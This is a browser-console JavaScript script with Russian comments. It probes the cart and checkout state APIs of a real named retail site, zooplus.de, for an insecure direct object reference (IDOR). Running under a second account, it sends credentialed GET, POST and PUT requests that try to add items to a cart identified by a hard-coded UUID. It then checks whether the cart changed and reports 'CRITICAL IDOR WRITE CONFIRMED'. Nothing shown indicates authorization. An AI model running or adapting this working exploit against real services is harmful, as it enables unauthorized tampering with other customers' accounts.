// Детальный тест state API (Test 8 вернул 200)
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";
const OFFER_ID = 2966095;

console.log("[*] Testing state API in detail...");

// Получить текущее состояние
fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
  credentials: 'include'
})
.then(r => r.json())
.then(cart => {
  window.beforeCount = cart.articles.length;
  window.beforeTotal = cart.summary.grandTotal;
  console.log(`[+] Cart before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
  
  // Попробовать разные варианты state API
  const tests = [
    // GET state
    fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/cart/${CART_UUID}`, {
      method: "GET",
      credentials: "include"
    }),
    
    // POST с разными payload
    fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/cart/${CART_UUID}`, {
      method: "POST",
      credentials: "include",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({action: "add", offerId: OFFER_ID, quantity: 1})
    }),
    
    fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/cart/${CART_UUID}`, {
      method: "POST",
      credentials: "include",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({articles: [{offerId: OFFER_ID, quantity: 1}]})
    }),
    
    fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/cart/${CART_UUID}`, {
      method: "PUT",
      credentials: "include",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({action: "add", offerId: OFFER_ID})
    }),
  ];
  
  return Promise.allSettled(tests.map((p, i) => 
    p.then(r => {
      console.log(`State API Test ${i+1}: HTTP ${r.status}`);
      return r.text().then(text => {
        if (r.status === 200 && text.startsWith('{')) {
          console.log(`  [!!!] JSON Response: ${text.substring(0, 500)}`);
          try {
            const json = JSON.parse(text);
            console.log(`  [!!!] Parsed JSON:`, json);
          } catch(e) {}
        } else if (r.status === 200) {
          console.log(`  Response (HTML?): ${text.substring(0, 200)}`);
        }
        return {status: r.status, text: text.substring(0, 300)};
      });
    }).catch(e => {
      console.log(`State API Test ${i+1}: Error - ${e.message}`);
      return {error: e.message};
    })
  ));
})
.then(() => {
  console.log("\n[*] Checking cart after state API tests...");
  return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  });
})
.then(r => r.json())
.then(cart => {
  const afterCount = cart.articles.length;
  const afterTotal = cart.summary.grandTotal;
  console.log(`[+] Cart after: ${afterCount} items, ${afterTotal} EUR`);
  
  if (afterCount !== window.beforeCount || Math.abs(afterTotal - window.beforeTotal) > 0.01) {
    console.log("\n[!!!] CRITICAL IDOR WRITE CONFIRMED!");
  } else {
    console.log("[!] Cart unchanged");
  }
})
.catch(e => console.error("[!] Error:", e));

